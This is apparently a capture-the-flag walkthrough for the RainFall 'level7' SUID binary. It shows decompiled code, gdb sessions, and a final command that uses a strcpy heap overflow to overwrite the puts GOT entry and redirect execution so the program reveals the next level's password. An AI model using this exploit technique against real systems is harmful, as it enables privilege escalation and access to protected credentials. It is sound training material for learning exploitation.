# Level7

# Tools

# Walkthrough
The home of level7 contains a binary, `level7`. As usual, it has the SUID bit set and is owned by `level8`. 

We decompile it using `dogbolt`, and we have two interesting functions, as well as a global variable:

```c
int m()
{
  time_t v0; // eax

  v0 = time(0);
  return printf("%s - %d\n", c, v0);
}

extern char c;

int main(unsigned int v2)
{
    struct_0 *v0;  // [bp-0xc]
    struct_0 *v1;  // [bp-0x8]
    char v3;  // [bp+0x8]

    v1 = malloc(8);
    v1->field_0 = 1;
    v1->field_4 = malloc(8);
    v0 = malloc(8);
    v0->field_0 = 2;
    v0->field_4 = malloc(8);
    strcpy(v1->field_4, *((int *)(*((int *)&v3) + 4)));
    strcpy(v0->field_4, *((int *)(*((int *)&v3) + 8)));
    fgets(&c, 68, fopen("/home/user/level8/.pass", "r"));
    puts("~~");
    return 0;
}
```

We want to look for the address and `m`:
```
objdump -t level7
...
080484f4 g     F .text	0000002d              m
...
```

Also, we notice a `puts` call:
```
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
```

Let's figure out the address of `puts` in the GOT:
We `disassemble` the address `0x8048400`, to get to the function tremplin:
```
(gdb) disass 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
   0x08048406 <+6>:	push   0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
```
Upon getting in the function tremplin, the code would jump to `0x8049928`, stored in the GOT:
```
(gdb) x 0x8049928
0x8049928 <puts@got.plt>:	0x08048406
```
We can also get that address with `info functions` in GDB.
`0x8049928` is the address we want to overwite to take control of the programme execution. Now let's find a way to do so!

We noticed, thanks to the decompilation, that the program required two arguments. As `strcpy` doesn't check if what's being written to its buffer fits inside before copying it, we can abuse it to crash the programme.
```
level7@RainFall:~$ ./level7 AAAABBBBCCCCDDDDEEEE a
~~
level7@RainFall:~$ ./level7 AAAABBBBCCCCDDDDEEEEF a
Segmentation fault (core dumped)
```
As we can see, when we added the `F`, the program crashed.

Also, we can make the programme crash with the second argument:
```
(gdb) r AAAABBBBCCCCDDDDEEEE 0000111122223333444455556666
Starting program: /home/user/level7/level7 AAAABBBBCCCCDDDDEEEE 0000111122223333444455556666

Program received signal SIGSEGV, Segmentation fault.
0xb7e90ba7 in fgets () from /lib/i386-linux-gnu/libc.so.6
(gdb) backtrace
#0  0xb7e90ba7 in fgets () from /lib/i386-linux-gnu/libc.so.6
#1  0x080485f0 in main ()
(gdb) r AAAABBBBCCCCDDDDEEEEF a
Starting program: /home/user/level7/level7 AAAABBBBCCCCDDDDEEEEF a

Program received signal SIGSEGV, Segmentation fault.
0xb7eb8f23 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) backtrace
#0  0xb7eb8f23 in ?? () from /lib/i386-linux-gnu/libc.so.6
#1  0x080485c2 in main ()
```
Thanks to `backtrace`, and the fact that two different conditions make us segfault, we know that we have two different segfaults vulnerabilities.
By digging on the topic, we understand that the first `strcpy` will give us the flexibility to write **anywhere** we want (where the `FFFF` are), and the second let's us write **whatever** we want.
Here, we confirm that we succesfully hijacked the execution flow by writing 0s to EIP, by replacing the content stored at address `0x8049928`, `puts`'s address:
```
(gdb) run $(python -c 'print "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"') 000011112222
Starting program: /home/user/level7/level7 $(python -c 'print "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"') 000011112222

Program received signal SIGSEGV, Segmentation fault.
0x30303030 in ?? ()
(gdb) info registers
eax            0x80486eb	134514411
ecx            0xbffff8db	-1073743653
edx            0x80486e9	134514409
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff6ac	0xbffff6ac
ebp            0xbffff6d8	0xbffff6d8
esi            0x0	0
edi            0x0	0
eip            0x30303030	0x30303030    <------ 0000 here
eflags         0x210246	[ PF ZF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

We eventually pass the address of `m` as the second argument, and get our password.
Make sure to run it **outside** of GDB, as to run `fgets` the SUID bit needs to be set, and GDB won't run it with the file owner's privileges as it disables SUID!

```bash
./level7 $(python -c 'print "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```
